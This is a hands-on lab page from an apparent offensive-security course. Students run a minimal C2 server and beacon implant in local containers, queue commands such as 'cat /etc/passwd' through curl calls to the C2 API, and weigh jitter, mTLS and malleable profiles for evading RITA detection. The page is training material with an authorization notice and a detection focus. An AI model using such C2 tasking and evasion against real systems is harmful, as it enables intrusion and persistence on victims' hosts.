# Lab 13 — Run a C2 Framework

*Hands-on lab · [← Back to the module concept](README.md)*


## Setup

```bash
git clone https://github.com/plaintext-security/plaintext-labs.git
cd plaintext-labs/offensive/13-c2-postex
make up
```

The compose starts three containers:
- **c2-server** — Flask-based C2 server (session manager + task queue)
- **target** — simulated "compromised" host running the beacon implant
- **operator** — operator console for running the demo

The implant beacons every 5 seconds (±1s jitter), receives tasks, and returns output.

## Scenario

You've deployed an implant on a Meridian Financial application server. Use the C2
framework to maintain access, enumerate the host, and establish persistence. Then
switch hats: analyze what you left on the wire and how a defender would detect it.

> Authorization: this app is yours — attack it freely. The habit still matters everywhere else:
> only test systems you own or have explicit written permission to test (DVWA, PortSwigger Academy,
> targets you own).

## Do

1. [ ] Read `implant/beacon.py` and `server/c2_server.py` first to learn the API the
   implant and operator speak, then drive a full post-ex session yourself in step 4 before
   watching the worked run. (`make demo` runs the validated end-to-end C2 lifecycle —
   session check-in, tasking, results — use it afterwards to confirm your session ID, host
   info, and command output match.)

2. [ ] Read `implant/beacon.py`. Trace the beacon loop:
   - What data does each check-in POST to the server?
   - How does the implant apply jitter, and why?
   - What's the difference between the real UID and the username shown?

3. [ ] Read `server/c2_server.py`. Understand the API:
   - How does the server track active sessions?
   - How does the task queue work (FIFO push/pop)?
   - What does the operator see vs. what the implant sends?

4. [ ] Shell into the operator container and interact with the C2 manually:
   ```bash
   make shell
   # Get sessions:
   curl http://c2-server:5000/api/sessions
   # Queue a task (replace SID with your session ID):
   curl -X POST http://c2-server:5000/api/task \
     -H 'Content-Type: application/json' \
     -d '{"sid":"<SID>","cmd":"cat /etc/passwd"}'
   # Read results after 6s:
   sleep 6 && curl http://c2-server:5000/api/results/<SID>
   ```

5. [ ] Analyze the beaconing pattern:
   - Watch the beacon traffic: `docker compose logs target | head -30`
   - What interval and jitter values make the beacon harder to score with RITA?
   - Why does Cobalt Strike's "sleep" command with high jitter help evade RITA?

6. [ ] Compare this minimal HTTP C2 to Sliver (read the [Sliver README](https://github.com/BishopFox/sliver)):
   - What protocols does Sliver support (HTTP, DNS, mTLS, WireGuard)?
   - Why is mTLS harder to inspect than cleartext HTTP?
   - What is a "malleable C2 profile" and why does it matter for evasion?

## Success criteria — you're done when

- [ ] You observed the implant check-in and captured the session ID.
- [ ] You ran at least three post-ex commands via the task queue manually.
- [ ] You can explain the beacon interval, jitter, and why both matter for detection.
- [ ] You can compare this minimal C2 to Sliver on at least two dimensions (protocol, obfuscation).

## Deliverables

`c2-notes.md`: the session details, three post-ex outputs, and a comparison of this
minimal C2 vs. Sliver — what does a real C2 add on protocol, evasion, and post-ex modules?

## Automate & own it

**Required.** Write an operator script `operator.py` that:
- Connects to the C2 server API
- Takes a session ID and a list of commands
- Executes each command, waits for the result, and writes a timestamped log

AI drafts the script; you review the API calls and timing logic. Commit `operator.py`
alongside `c2-notes.md`.

## AI acceleration

Ask a model to explain the difference between a reverse shell and a C2 implant —
specifically: what does the task/result channel add that a raw shell doesn't?
Then verify against the Sliver documentation.

## Connects forward

A managed C2 session is the platform for Track 06 (Active Directory) attacks —
Kerberoasting, DCSync, and credential dumping all run through post-ex modules in
frameworks like Sliver or Cobalt Strike. The defensive inverse is Track 02's
beacon-hunting module (12-hunting-network) — the same RITA scoring you ran.

## Marketable proof

> "I operate a C2 framework — establish sessions, run post-ex modules, plant
> persistence — and can explain the beaconing artifacts and detection techniques
> that surface it in a SOC."

## Stretch

- Modify `implant/beacon.py` to add randomised User-Agent headers. Run RITA-style
  beacon scoring from module 12 against the Zeek conn.log. Does the score change?
- Replace the HTTP transport with HTTPS (self-signed cert). What changes in the
  detection picture?
